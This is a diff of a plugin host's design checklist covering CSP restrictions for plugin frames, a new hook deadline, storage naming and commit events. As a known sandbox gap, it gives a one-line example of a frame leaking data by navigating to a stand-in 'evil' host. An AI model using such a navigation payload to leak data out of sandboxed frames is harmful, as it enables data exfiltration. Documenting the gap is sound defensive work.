@@ -78,8 +78,9 @@ afterCommit hooks and three unrelated webhook proposals. Plugin state
 - [x] Integration-proxy requests from frames go through the host (a
       `proxyFetch` host op restricted to the minted capability's origin)
       instead of a direct `fetch` from the frame.
-- [ ] `img-src 'self' data: blob:` and `font-src 'self' data:`: a remote
+- [x] `img-src 'self' data: blob:` and `font-src 'self' data:`: a remote
       image or font URL can carry data in its query string.
+      *Done* (`handlers/plugin_ui.rs`).
 - Known gap: a frame can navigate itself (`location = 'https://evil/?' +
   data`). No CSP directive blocks a document navigating itself
   (`navigate-to` was dropped from CSP). Closing it needs the frame to hold no
@@ -225,9 +226,16 @@ afterCommit hooks and three unrelated webhook proposals. Plugin state
       from a hook finds the apps of its drive. A server extension may declare
       `uses` now; a module that declares some loads the drive's apps before
       each hook.
-      *Next:* an entry deadline for hooks (only fuel and memory bound them),
-      the `storage` folder under the ABI's own name, and move `events`
-      `commit` in as the after-commit.
+      *Built (2026-10-23): the leftovers.* A hook runs under a wall-clock
+      deadline (`HOOK_DEADLINE`, 5 s, `module.rs`), the same `tokio` timeout
+      an app's entry call has (`with_deadline`), not wasmtime epochs: a
+      component yields at every fuel interval, so dropping it stops it, and
+      the timeout also covers the host calls it waits on. It fails like out of
+      fuel. The module's folder is `storage_dir` in code, after the capability
+      that makes it writable; the on-disk path (`class-extenders/scoped/..`) is
+      unchanged, so nothing migrates. `events` `commit` stays: it is how an app
+      learns of a commit, and apps have no hooks (a server module does not
+      import `events`), so it does not duplicate `after-commit`.
 - [ ] Conformance suite: run published catalog releases against each host
       build (regression test until v1, a promise after).
 
